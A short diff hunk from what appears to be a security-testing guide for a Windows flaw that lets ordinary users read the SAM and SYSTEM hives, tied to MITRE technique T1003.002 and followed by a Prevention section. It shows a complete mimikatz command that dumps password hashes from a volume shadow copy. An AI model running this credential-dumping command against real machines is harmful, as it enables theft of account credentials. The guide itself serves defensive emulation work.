@@ -23,6 +23,7 @@ A vulnerable system will report ```BUILTIN\Users:(I)(RX)```
 1. Create a new campaign
 2. Select the Compound Action for T1003.002
 Note: you may need to change the HarddiskVolumeShadowCopy#
+
 ```mimikatz "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\system /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\\sam"```
 
 ## Prevention
